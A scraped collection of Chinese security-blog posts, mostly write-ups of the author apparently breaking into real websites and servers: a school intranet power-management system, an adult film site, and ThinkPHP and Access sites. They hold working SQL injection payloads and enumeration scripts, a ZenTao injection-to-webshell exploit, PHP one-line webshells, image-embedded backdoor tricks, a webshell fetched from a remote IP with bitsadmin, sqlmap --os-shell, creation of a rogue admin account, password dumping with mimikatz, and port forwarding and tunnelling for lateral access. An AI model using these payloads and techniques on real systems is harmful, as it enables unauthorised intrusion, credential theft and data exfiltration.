运行完毕后(记得删除)，发现3389端口已经开启了 Kali下连接远程桌面出了点小问题，百度了下，也没讲多清楚（暂时就放弃了）。 不过后来换到win系统上好像就没问题了，因为当时就想着还是怎么方便怎么来（实体机运行的kali，换回win还得切系统），也就没抓密码。 尝试GetShell先找到web所在目录(带空格的目录记得用双引号)： 1234dir c:\\dir \"c:\\Program Files\\\"...dir \"c:\\Program Files\\Apache Software Foundation\\Tomcat 7.0\\webapps\\eleServer\\\" 看后台应该是个电力管理系统： 最后决定将shell放在该系统ui框架的某目录下了 同样用远程文件下载jsp大马到该目录下 1bitsadmin /transfer n http://IP/xieying.jsp \"c:\\Program Files\\Apache Software Foundation\\Tomcat 7.0\\webapps\\eleServer\\BJUI\\plugins\\xieying.jsp\" 浏览器上访问大马并登陆： 结束感觉再弄无非就是远程登陆，没什么必要，翻了翻系统文件，就把这个电力系统的war包，还有备份的数据库拿了下来，本地自己搭建下，应该就能得到系统的账号密码了。 删了shell，我还是个听话的好学生。","link":"/2019/04/01/渗透学校某内网服务器/"},{"title":"禅道8.2-9.2.1注入GetShell","text":"漏洞分析先附上某老哥的漏洞分析，来了解下原理。 漏洞复现查看版本我这里用的官方集成环境版本8.4 获取版本号：/index.php?mode=getconfig 绝对路径获取绝对路径：网址后面随便输入什么就会爆出绝对路径 没路径的报错exp： 1{&quot;orderBy&quot;:&quot;order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;} base64加密： 1eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= EXP提交地址：http://127.0.0.1:81/zentao/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=base64 ※exp需要base64加密后才能提交，且回显、写Shell须加上Referer：http://127.0.0.1:81/zentao/ 注入显密码：1{&quot;orderBy&quot;:&quot;order limit 1;#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;} base64加密： 1eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTsjIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== 不知道什么原因，本地复现无账号密码回显。。。 前台GetShell：1{&quot;orderBy&quot;:&quot;order limit 1;SET @SQL=0x73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027;PREPARE pord FROM @SQL;EXECUTE pord;-- -&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;} 其中有部分使用了MySQL的预处理查询绕过程序的过滤： 导出shell： 1select &apos;&lt;?php @eval($_POST[x])?&gt;&apos; into outfile &apos;D:/zentao/xampp/zentao/www/hack.php&apos; HEX编码：（注意加密解密都不带0x，但是EXP中需要加上） 173656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027 base64加密： 1eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2QzY1NjM3NDIwMjczQzNGNzA2ODcwMjA0MDY1NzY2MTZDMjgyNDVGNTA0RjUzNTQ1Qjc4NUQyOTNGM0UyNzIwNjk2RTc0NkYyMDZGNzU3NDY2Njk2QzY1MjAyNzQ0M0EyRjdBNjU2RTc0NjE2RjJGNzg2MTZENzA3MDJGN0E2NTZFNzQ2MTZGMkY3Nzc3NzcyRjY4NjE2MzZCMkU3MDY4NzAyNztQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== 访问之即可在目录下生成hack.php：","link":"/2018/11/26/禅道8.2-9.2.1注入Getshell/"},{"title":"端口渗透总结","text":"常见的端口-服务-攻击方向参考：端口渗透总结 文件共享服务端口 端口号 端口说明 攻击方向 21/22/69 Ftp/TFtp文件传输协议 匿名上传、下载、爆破和嗅探 2049 Nfs服务 配置不当 139 Samba服务 爆破、未授权访问、远程代码执行 389 Ldap目录访问协议 注入允许、匿名访问、弱口令 远程链接服务端口 端口号 端口说明 攻击方向 22 SSH远程连接 爆破、SSH隧道及内网代理转发、文件传输 23 Telnet远程连接 爆破、嗅探、弱口令 3389 Rdp远程桌面连接 Shift后门(Win sever 2003以下系统)、爆破 5900 VNC 弱口令爆破 5632 PyAnywhere服务 抓密码、代码执行 Web应用服务端口 端口号 端口说明 攻击方向 80/443/8080 常见web服务端口 web攻击、爆破、对应服务器版本漏洞 7001/7002 weblogic控制台 Java反序列化、弱口令 8080/8089 Jboss/Resin?Jetty/Jenkins 反序列化、控制台弱口令 9090 WebShphere控制台 Java反序列化、弱口令 4848 GlassFish控制台 弱口令 1352 Lotus domino邮件服务 弱口令、信息泄露、爆破 10000 Webmin-Web控制面板 弱口令 数据库服务端口 端口号 端口说明 攻击方向 3306 Mysql 注入、提权、爆破 1433 MSSQL数据库 注入、提权、SA弱口令、爆破 1521 Oracle数据库 TNS爆破、注入、反弹Shell 5432 PostgreSQL 爆破、注入、弱口令 27017/27018 MongoDB 爆破、未授权访问 6379 Redis数据库 可尝试未授权访问、弱口令、爆破 5000 SysBase/DB2数据库 爆破、注入 邮件服务端口 端口号 端口说明 攻击方向 25 SMTP邮件服务 邮件伪造 110 POP3协议 爆破、嗅探 143 IMAP协议 爆破 网络常见协议端口 端口号 端口说明 攻击方向 53 DNS域名系统 允许区域传送、DNS劫持、缓存投毒、欺骗 67/68 DHCP服务 劫持、欺骗 161 SNMP协议 爆破、搜集目标内网信息 特殊服务端口 端口号 端口说明 攻击方向 2181 Zookeeper服务 未授权访问 8069 Zabbix服务 远程执行、SQL注入 9200/9300 Elastcsearch服务 远程执行 11211 Memcache服务 未授权访问 512/513/514 Linux Rexec服务 爆破、Rlogin登陆 873 Rsync服务 匿名访问、文件上传 6390 Svn服务 Svn泄露、未授权访问 50000 SAPManagement Console 远程代码执行","link":"/2018/11/28/端口渗透总结/"},{"title":"解析漏洞汇总","text":"※什么是解析漏洞？ 简单的说，解析漏洞就是web容器将其他格式的文件解析为可执行脚本语言，攻击者可以利用这个特征去执行一些攻击行为。 IIS 解析漏洞※使用IIS6.0的服务器，一般是Windows server 2003，解析语言是asp，不能解析aspx语言 IIS6.0 在解析文件时存在以下两个解析漏洞 目录解析：当建立 .asa ，.asp 格式的文件夹时，其目录下的任意文件都将被 IIS 当作 asp 文件来解析 后缀解析：在 IIS6.0 下，分号”;”后面的扩展名不会被解析，也就是说当文件为 *.asp;.jpg 时，IIS6.0 同样会以 ASP脚本来执行 默认解析：其他可执行文件格式 1234*.asa*.cer*.cdx（这种格式也会解析，但是和版本有关）*.asa 此处可联系利用目录解析漏洞 /xx.asa/xx.jpg 或 /xx.cer/xx.jpg 或 xx.asa;.jpg Apache 解析漏洞在 Apache 1.x 和 Apache 2.x 中存在解析漏洞 , 但他们与 IIS 解析漏洞不同 Apache 在解析文件时有一个规则： 当碰到不认识的扩展名时，将会从后向前解析，直到碰到认识的扩展名位置，如果都不认识，则会暴露其源码，比如： 1test.php.rar.xx.aa Apache 首先会解析 aa 扩展名，如果不认识则接着解析 xx 扩展名，这样一直遍历到认识的扩展名为止，然后再将其进行解析 PHP CGI 解析漏洞在PHP的配置文件中有一个关键的选项 [Fast-CGI]：cgi.fix_pathinfo=1 这个选项在某些版本是默认开启的，在开启时访问 url 比如：http://www.xxx.com/x.txt/x.php ，x.php 是不存在的文件，所以 php 将会向前递归解析，于是就造成了解析漏洞 由于这种漏洞常见于 IIS7.0 、 IIS7.5 、 Nginx 等 Web服务器，所以经常会被误认为是这些 Web服务器的解析漏洞 常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾 1234567copy xx.jpg/b + yy.txt/a xy.jpg/b 即二进制[binary]模式/a 即ascii模式 xx.jpg正常图片文件 yy.txt 内容 &lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt;意思为写入一个内容为 &lt;?php eval($_POST[cmd])?&gt; 名称为shell.php的文件找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。然后就在图片目录下生成一句话木马 shell.php 密码 cmd 经验之谈：php|php3|php5|phtml 多可被Apache解析 Nginx &lt;8.03 空字节代码执行漏洞在Fast-CGI关闭的情况下，Nginx &lt;8.03依然存在解析漏洞 影响版本：0.5，0.6，0.7&lt;=0.7.65，0.8&lt;=0.8.37 Nginx 在图片中嵌入PHP代码 , 然后通过访问 xxx.jpg%00.php 可以执行其中的代码 其他在 windows 环境下， xx.jpg[ 空格 ] 或 xx.jpg，这两类文件都是不允许存在的，若这样命名 windows 会默认除去空格或点， 攻击者可以通过抓包，在文件名后加一个空格或者点绕过黑名单 若上传成功，空格和点都会被 windows 自动消除，这样也可以 getshell 如果在 Apache 中 htaccess 可被执行，且可被上传。那可以尝试在 .htaccess 中写入 ： 1SetHandlerapplication/x-httpd-php 然后再上传名称为 shell.jpg 的 webshell， 这样 shell.jpg 就可解析为 php 文件","link":"/2019/01/03/解析漏洞汇总/"},{"title":"记一次Access偏移注入","text":"足够猥琐的思路，往往能带来意想不到的效果。 前言一直想找个目标站，练习一下Access的偏移注入，今天遇见个站，用Sqlmap只能跑出来表名，好的就它了。 已知表名：tbladmin 偏移注入判断字段数1order by 12 爆出显示位1union select 1,2,3,4,5,6,7,8,9,10,11,12 from tbladmin 使用偏移注入由于列名猜解不出来（后面有猥琐思路），所以使用偏移注入 1234union select 1,2,3,4,5,6,7,8,9,10,11,12,* from tbladmin - 报错union select 1,2,3,4,5,6,7,8,9,10,11,* from tbladmin - 报错....union select 1,2,3,4,5,6,7,8,* from tbladmin - 正常 说明了tbladmin表下有8个字段, * 代表了所有字段，比如查 tbladmin 表，它有几个字段，那么 * 就代表几个字段 偏移注入的基本公式order by 出来的字段数减去 * 号前的字段数，然后再用order by 出来的字段数减去2倍刚才得出来的答案 1即 12-8=4 ，12-2*4=4 关于为什么要减去乘2的问题：由于这个(tbladmin as a inner join tbladmin as b on a.id=b.id)是tbladmin表自连接的，这样from 后面的表就会成为字段数加倍的表 这样就可以使 * 代表的字段拓宽，加大账号，密码在显示位出现的几率 1union select 1,2,3,4,* from (tbladmin as a inner join tbladmin as b on a.id=b.id) 当前字段数已经为：4+4*2 = 12 = 12，这条语句显然是合法的 现在可以看到，只出现了账号admin，我们还需要密码，所以继续打乱顺序 12union select 1,2,3,4,a.id,* from (tbladmin as a inner join tbladmin as b on a.id=b.id) - 页面无变化union select 1,2,3,4,a.id,b.id,* from (tbladmin as a inner join tbladmin as b on a.id=b.id) - admin变成1 这里有个偏移注入的核心问题当前字段数已经为：4+2+4*2 = 14 &gt; 12，但这条语句却依然是合法的，为什么呢？ 因为 a.id 和 b.id 在 * 里是有的，所以计算机会自动去掉重复的， 保持集合里元素的唯一性，这样一来最终查询效果的一样，但是里面字段排列顺序却被打乱了，所以才造成了偏移注入的产生。 目前我们已经进行了两次打乱，但是密码还是没有偏移到可显示的位置，这时，我们就需要继续来打乱顺序 1union select a.id,b.id,c.id,* from ((tbladmin as a inner join tbladmin as b on a.id=b.id) inner join tbladmin as c on a.id=c.id) 当前字段数已经为：0+4*3 = 12 = 12，所以这条语句还是合法的 继续打乱 1union select a.id,b.id,* from ((tbladmin as a inner join tbladmin as b on a.id=b.id) inner join tbladmin as c on a.id=c.id) 1union select a.id,* from ((tbladmin as a inner join tbladmin as b on a.id=b.id) inner join tbladmin as c on a.id=c.id) 至此，成功完成，拿去解密发现，WTF，解不出来。。。： 联合注入（猥琐）有时候渗透的思路真是要猥琐至极才好，我沉思了几分钟之后，灵光一闪，掏出了我的御剑珍藏版，扫出了后台（为什么这里要写出来呢，感觉可以算是一种思路） 看下登陆框源码凭借我多年老司机的经验，这个名字就有可能是列名了： 直接联合查询1union select 1,admin_name,admin_pass,4,5,6,7,8,9,10,11,12 from tbladmin 登陆后台+GetShell但是现在出来依然是admin，直接在Sqlmap里面把表名，列名都指定出来，去dump看看还有没有其他账户 1sqlmap.py -u url -T tbladmin -C admin_name,admin_pass --dump 发现ljy账户的密码是可以解密的，成功登陆后台，找到一处任意文件上传成功getshell： { 顺带说一下，这个文件上传链接固定，且不需要登陆，是一个通杀，凡是使用该程序的站点，基本都可以秒下来。} 这次又是个内网的机器，最近遇到的有点多，用了几个新出的exp，提权失败了，反弹msf也没成功。。。暂时放弃","link":"/2019/03/10/记一次Access偏移注入/"},{"title":"记一次曲折的报错注入","text":"机缘巧合，查询旁站时随手点开的一个网站，加单引号 ' 页面报错，同时爆出的还有sql查询语句，程序版本ThinkPHP V5.0.14，测试了下前一阵子爆出来的exp，应该也是修复了。 尝试联合查询注入首先尝试闭合，构造注入语句： 12345http://xxx.com/pc/category/index/id/48) %23.html - 正常显示，闭合成功http://xxx.com/pc/category/index/id/48) and &apos;1&apos;=&apos;1&apos; %23.html - 正常显示http://xxx.com/pc/category/index/id/48) and &apos;1&apos;=&apos;2&apos; %23.html - 页面报错http://xxx.com/pc/category/index/id/48) order by 1 %23.html - order by 1 正常http://xxx.com/pc/category/index/id/48) order by 2 %23.html - order by 2 出现谜之报错，纠结了一阵 1http://xxx.com/pc/category/index/id/48) order by (2.html - 这样构造就可以正常了，测试最大为30 失败联合查询来一下试试，报错了，之后尝试各种方法去闭合均报错，只好暂时放弃了，没了头绪 1http://xxx.com/pc/category/index/id/48) union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 %23.html 尝试报错注入时间到了晚上，多亏了漂亮仔师傅的提醒，还有这么一种一直被自己忽略的注入，传送门：报错注入，学习了一下,开始构造语句： 暴库1http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,schema_name,0x7e))) from information_schema.schemata limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html - 爆出库名fangbiao，一共就两个，还好库不多 爆表1http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,table_name,0x7e))) from information_schema.tables where table_schema=0x66616E676269616F limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html 总共有42张表，一个一个手动弄出来得累死，写了个脚本，表名结果太多我就不全列出来了 123456import reimport requestsfor i in range(0, 43): Response = requests.get('http://xxx.com/pc/category/index/id/48)%20and(select%201%20from(select%20count(*),concat((select%20(select %20(select%20concat(0x7e,table_name,0x7e)))%20from%20information_schema.tables%20where%20table_schema=0x66616E676269616F%20limit%20{0},1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a'.format(str(i))) array=(re.findall(\"violation: 1062 Duplicate entry '~(.*?)~1' for key\", Response.text)) print(array[1]) 爆列这里就遇到一个坑了,继续构造正常的报错注入语句，url太长，超出服务器接受范围，直接报错400，又没了头绪，卡住 1http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_schema=0x66616E676269616F and table_name=71735F61646D696E5F6D656E75 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html 此时已经第二天上午，突然想到能不能给它缩短下，如果去掉表名限制，那么就是查出库里所有的列，试了一下，果然，成功爆出来了列名 1http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_schema=0x66616E676269616F limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html 这里测了下，405个列，果断掏出脚本改改就安排上了 123456import reimport requestsfor i in range(0, 406): Response = requests.get('http://xxx.com/pc/category/index/id/48)%20and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,column_name,0x7e)))%20from%20information_schema.columns%20where%20table_schema=0x66616E676269616F%20limit%20{0},1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a'.format(str(i))) array=(re.findall(\"violation: 1062 Duplicate entry '~(.*?)~1' for key\", Response.text)) print(array[1]) 完美跑出了405个列，仔细看了看结果，选几个看起来特征比较明显的来测吧，没必要全部测试 1234usernameuser_passuser_nicknamehas_admin 爆数据1http://xxx.com/pc/category/index/id/48) and(select 1 from(select count(*),concat((select (select (select concat(0x7e,字段名,0x7e))) from fangbiao.表名 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a.html 我的想法是用以上url，先固定一个列名，然后遍历所有表名，如果当前列在当前表名中，就会有数据内容返回 本来想继续用脚本，思路就是脚本里按行读取tables.txt（按行存放的表名）的每一行内容，去拼接url，然后获取返回内容中有没有数据，结果返回的内容全为400了 这里用burp的爆破功能，可以达到一样的效果，唯一的不足之处就是要手动查看返回包了，尝试下user_pass，发现出来了数据，其他获取数据方法同理 收工爆破出来的后台登陆地址被302跳转了，然后就没再测下去，其实也没心思再看下去了，这两天基本全在弄这个东西，之所以坚持要搞出来也是因为想弄清楚报错注入的利用方式，这次折腾完了又收获不少，文章看似很顺利，但是亲自上手就会发现坑真的不少，总结一下，留做纪念吧。（啥时候才能变成dalao啊）","link":"/2019/03/06/记一次曲折的报错注入/"},{"title":"记一次渗透提权03服务器","text":"过渡。 GetShell站点是批量测注入的时候发现的，随手测了下后台就是admin，登陆进去发现有两处应该可以拿shell 备份文件备份功能稳不稳定不知道，怕把站点搞死，最后还是通过备份成功getshell的 XD 图片上传测试了修改文件类型，00截断，.asa、.cer….等无效，而且上传的文件名自动转换时间戳重命名，遂放弃。 不过有意思的是，右键源代码把编辑器揪出来了，开发把编辑器隐藏显示了，如下图（display:none改成on后即可显示，然鹅没有卵用，并不正常显示） 知道是eWebEditor的编辑器，编辑器后台地址：http:127.0.0.1/pluck%60edit/admin/login.asp，尝试了爆破，弱口令，默认备份mdb下载均无果也放弃了。（后来进去翻到账号就是建站公司的英文名字，密码加了个三位数，信息搜集对于爆破这一块还挺重要的） 提权权限提升进去大马（站点仅支持asp），可以直接执行cmd，就是权限很低 systeminfo直接看打了什么补丁，拿exp先怼怼看，复制下来补丁信息，扔进去 提权辅助这个网页里比较下，可以使用 IIS6.0 的一个 exp，传到可读写目录里，我这里就是 C:\\wmpub ，然后就用 IIS6.0.exe 执行命令，发现是system权限了，同样的方法添加一个管理员帐号。 远程连接由于主机在内网，开放的就是3389端口，我们只需要将主机的3389端口转发出来，就可以连接上去 端口转发工具：lcx （具体使用方法移步：传送门） 公网主机： 1lcx -listen 2222 6666 肉鸡： 1lcx.exe -slave 公网主机ip 2222 127.0.0.1 3389 然后公网主机连接127.0.0.1:6666，发现连接失败，我丢。。。。（quser查询有一个前几天在线的管理，logoff踢掉了，然鹅还是上不去） 就到这里吧。","link":"/2019/02/17/记一次渗透提权03服务器/"},{"title":"记一次渗透提权某影视站","text":"前几天看到个问题：渗透的本质是什么？我觉得渗透的本质就是人与人之间的博弈。 起因打开服务器上批量了一晚上的结果，发现这么一个影视网站，啧啧，查了下权重3，不过是反射，补天不要反射也没什么用啊，看看有没有什么好看的爱情动作电影吧 这种影视站，多半有些让人害羞的东西，然后打开网站的伦理分类： http://无敌/打码/m.aspx?id=10 ，哇舒服了~ 注入加账号随手加个'单引号，报错了，但是还不能确定 然后and 1=1页面正常，and 1=2页面里的小片片全没了，八成存在注入 丢到 sqlmap里，这就注入过程就不写太详细了 这个是用户表，感觉应该会有好多数据，而且内容也很全，胆子小没敢dump 但是不甘心就这么完了，看了看当前用户为sa 1sqlmap.py -u http://无敌/打码/m.aspx?id=10 --batch --current-user --current-db 直接–os-shell，运气这东西真没法说，我第一次真实渗透环境下成功使用这个命令 这是直接就可以添加用户的节奏，不过先不急，看看开没开远程端口 1nmap 远程ip -p1-10000 3389开放，尝试连接是可以弹出远程登陆界面的，所以我们就直接加账号了，下图可以看到添加成功了 成功登陆成功登陆上去 quser查了下，2019.2.20管理登陆过一次，一直还没注销呢，应该可以抓出密码，传上mimi神器，这里就在本机运行了 使用方法：传送门 意外密码刚抓出来，还没等我复制到本地保存呢，意外发生了 应该是管理登陆了吧，不过被发现也不是不可能，等晚一点再看看，有人叫我把管理挤下去，我觉那就直接暴露了，在等等看吧，权限没有掉的话，有可能会继续更新。 成功等到了半夜，强制连接一波，这个方法可以突破最大连接数 1mstsc /admin 还好权限没掉，我又进来了，打开mimi抓了一下，有结果了，复制到本地查看 打完收工，这个网站只有种子，下载下来也没什么用，擦擦屁股走人了。。。","link":"/2019/03/01/记一次渗透提权某影视站/"},{"title":"起点","text":"新的起点，新的开始俨然已经两年之久的时光从Zblog到WordPress再到现在托管到GitHub的Hexo博客换了又换 不过很庆幸自己能够坚持写下来所以两年才能有些沉淀 翻看之前写的文章不由得感慨两年的成长历历在目有开心，亦有悲伤 最后，想说不忘初心续写属于自己的故事","link":"/2017/11/21/起点/"},{"title":"配置reGeorg+Proxifier渗透内网","text":"使用环境内网环境，防火墙DMZ区域映射外网端口，使用常规lcx等反弹工具会被各种安全软件拦截，尝试各种提权无果，这个时候就需要一款内网代理和端口转发工具，穿越防火墙的阻挡直连内网。 需要的工具Windows：reGeorg + Proxifier (软件自行搜索下载) Linux/MacOS：reGeorg + proxychains（本文暂不介绍） 配置reGeorg先将reGeorg的对应脚本上传到服务器端，reGeorg提供了PHP、ASPX、JSP脚本，直接访问显示“Georg says, ‘All seems fine’”，则表示脚本运行正常。 然后运行 reGeorgSocksProxy.py 这个py脚本，命令格式是（端口可以自定义）： 1python reGeorgSocksProxy.py -p 8080 -u http://url/tunnel.jsp 这个端口就是你所使用的本地代理端口，待会我们将使用 Proxifier这个工具进行全局的代理，将你指定的任何软件的流量代理到你本地的 xxxx 端口，然后我们的流量就会经过刚刚的脚本文件到了内网的服务器，我们就可以访问内网了。 有些端口可能会不成功，这是随着不同的主机定的，推荐使用 8080 或者 8808 。 如果我们这个脚本成功运行，你就会看到如下的图像： 配置 ProxifierProxifier能真正的实现全局的代理，你系统得每一个访问他都能代理，不仅如此，他还可以自己选择想要代理的任何软件，非常的方便，于是它也就成了windows下代理的神兵利器。 1.配置代理服务器：找到左上角菜单栏的第二个选项profile ，点开找到第一个选项 Proxy Server 点开就会弹出下面的对话框，然后你就按照你之前使用 reGeorg 的使用选定的端口进行配置（这里就是本机即127.0.0.1） ，这里我选择的是8080端口。 2.配置需要代理的软件这里不推荐实现全局代理，个人认为没有必要也不能达到最佳的性能，当然最重要的是非常的不方便，我们很多软件由于代理到内网都没法连接外网，于是就不能使用了。 （切记将python.exe添加例外，不然会死循环） 点开左上角第二个profile选项，选择Proxification Rules，将默认模式(Default)设置为不走代理的直接连接，然后选择需要代理的软件（如下图配置样例所示：我代理的分别是IP和端口扫描的工具） 代理成功后的界面（此为全局代理的截图，仅仅展示效果）： 实例应用shell中看到主机为内网IP 尝试扫描这台主机","link":"/2019/02/03/配置reGeorg+Proxifier渗透内网/"},{"title":"Access实例注入笔记","text":"前言：最近想把知识点，整理成一些文章，一点原因是对自己知识的沉淀做到温故而知新，另一点对于能帮助到别人解决疑惑也感到很开心。 下面开始重要内容：Access注入形成的原理本文不在详细赘述，否则篇幅会过长，更多的是记录方法（本文后续会永久保持更新）。 Asp环境：小旋风 靶机地址：192.168.19.138 网站源码：雷驰新闻系统v 1.0 Access数据库结构： Access数据库是以单文件，mdb格式，以表的形式存在，所以数据库也就是只有一个文件，它的结构如下图： 0x01-1 Access手工注入-逐字猜解法注入点：http://192.168.19.138/leichinews/onews.asp?id=40 1.猜解数据表我们在id后面构造语句and exists(select * from user)，意思是查询Access表中的user表，如果这个user表存在，页面就会返回正常，如果不存在，则就会报错，至于是不是user，就要靠我们来进行暴力猜解了 1http://192.168.19.138/leichinews/onews.asp?id=40 and exists(select* from user) [页面报错，说明数据库中不存在user表] 1http://192.168.19.138/leichinews/onews.asp?id=40 and exists(select* from admin) [成功执行，页面没有变化，说明数据库中存在admin表] 2.猜解数据列现在我们已经确定了该数据库中存在admin表，接下来当然是要猜解admin表中的列，在id参数后构造语句 and exists (select admin from admin)，这条语句的意思是：查询admin表中的admin列，如果存在则返回正常，不存在则返回错误页面，现在我们进行构造： 1http://192.168.19.138/leichinews/onews.asp?id=40 and exists(select admin from admin) 我们发现返回正常，说明admin表中存在admin列，我们再继续猜解，看还有哪些列，因为一般情况下，有一个账号列，就必然有一个密码列，因此现在继续猜解列，在id后构造内容and exists (select password from admin)，这条语句的大意为：查询admin表下的password列，如果存在就返回正常，如果不存在则页面报错: 如上，可以得出结论，admin表中存在password列，接下来我们猜解admin列和password列的长度是多少，因此只有确认了字段的长度，才能更加准确的来猜解数据的内容 3.猜解数据列的长度使用语句and (select top 1 len (admin) from admin)&gt;4，这条语句的意思是，如果admin表中admin列的长度大于4，则返回正常，如果小于4，则页面报错，现在进行猜解 当我们输入4的时候返回正常，输入5的时候返回错误，因此我们判定，admin列的长度为5，password列长度也和上一步操作一样，只需将admin列改为password列即可。 4.猜解数据列的内容接下来猜解admin列和password列的内容，在id后构造语句and (select top 1 asc (mid(admin,1,1)) from admin)&gt;96,这条语句的意思是，如果admin列中第一个字符的ASCII码如果大于97则返回正常，如果小于97则返回错误。 可以看到，当我们输入97的时候，显示错误，96返回正常，说明第一个字符的ASCII码为97，对照下方ASCII表，可以得出，admin列中第一个字符为a [构造and (select top 1 asc(mid(admin,2,1)) from admin)=97 则为判断第二位] password列和上述方法一样，通过构造语句，and (select top 1 asc (mid(password,1,1)) from admin)&gt;XX,其中X代表ASCII，根据页面的返回信息，可以很容易的判断出来字符的ASCII码，在通过上述表进行对照，即可得到账号密码，本文因篇幅有限，不再赘述重复的操作 通过一一的对比，我们成功的得出了账号密码。 0x01-2 Access手工注入-联合查询法1.查询数据列数目1order by xx 可知列数目为11 2.猜解数据表12http://192.168.19.138/leichinews/onews.asp?id=40 UNION SELECT1,2,3,4,5,6,7,8,9,10,11 from admin 查询access数据库中有没有admin表，存在返回正常，不存在返回错误 3.猜解数据列和列内容12http://192.168.19.138/leichinews/onews.asp?id=40 UNION SELECT1,admin,password,4,5,6,7,8,9,10,11 from admin 查询access数据库中admin表下面有没有username,password列内容；如果有则列出内容，没有显示报错 如图可以成功得出，admin和password列中的内容 0X02-1 Access工具注入-常规注入使用工具：SQLmap 1.猜解数据表1sqlmap.py -u http://192.168.19.138/leichinews/onews.asp?id=40 --dbs --tables –dbs表示将数据库显示出来，–tables是将表名显示出来 2.猜解数据列1sqlmap.py -u http://192.168.19.138/leichinews/onews.asp?id=40 -T admin --columns 其中， -T代表当前要猜解的表名， –columns 代表猜解列，等待一段时间可以得到admin表中的列名 3.猜解数据列内容1sqlmap.py -u http://192.168.19.138/leichinews/onews.asp?id=40 -T admin -C &quot;admin,password&quot; --dump -C 代表指定要猜解的列名，指定猜解admin和password列中的内容 0x02-2 Access工具注入-中转注入(cookie注入)通过SQLmap，提交cookie数据，注入中转，成功绕过通用型防注入，通用型防注入只是过滤了POST参数，但是没有过滤cookie参数，因此我们使用SQLmap提交cookie数据，就成功的绕过了。 1.猜解数据表1sqlmap.py -u http://192.168.19.138/leichinews/onews.asp --cookie &quot;id=40&quot; --level 3 --dbs --tables 其中 -u 代表要测试的URL，–cookie表示使用cookie的方式提交， –level 表示测试的等级, –dbs表示将数据库显示出来，–tables是将表名显示出来 程序员没有考虑到恶意用户会通过cookie来提交参数，因此没有调用防注入程序来过滤cookie部分，从而导致cookie注入的发生。 这条SQLmap命令，level值至少为2 时SQLmap才会测试cookie，我们输入这条命令，按下回车，这时耐心等待一段时间，SQLmap会自动将表名猜解出来 2.猜解数据列我们可以看到它已经猜解出了admin表和new表，根据经验判断，我们对admin表进行下一步猜解，使用命令 1sqlmap.py -u http://192.168.19.138/leichinews/onews.asp --cookie &quot;id=40&quot; --level 3 --dbs -T admin --columns 其中， -T代表 当前要猜解的表名， –columns 代表猜解列，等待一段时间可以得到admin表中的列名 3.猜解数据列内容账号密码一般都存储在admin和password列中，因此我们着重猜解这两列，使用命令 1sqlmap.py -u http://192.168.19.138/leichinews/onews.asp --cookie &quot;id=40&quot; --level 3 --dbs -T admin -C &quot;admin,password&quot; --dump 其中，–dump的意思是 将数据内容脱到本地，执行上述命令后可以成功得到账号密码","link":"/2018/09/12/Access实例注入笔记/"},{"title":"一套渗透测试岗面试题","text":"转载：阿里安全应急响应中心微信公众号 1.拿到一个待检测的站，你觉得应该先做什么？ ​ 1)信息收集​ 1，获取域名的whois信息,获取注册者邮箱姓名电话等。​ 2，查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。​ 3，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞​ 4，查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。​ 5，扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针​ 6，google hack 进一步探测网站的信息，后台，敏感文件​ 2）漏洞扫描​ 开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，​ 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等​ 3）漏洞利用​ 利用以上的方式拿到webshell，或者其他权限​ 4）权限提升​ 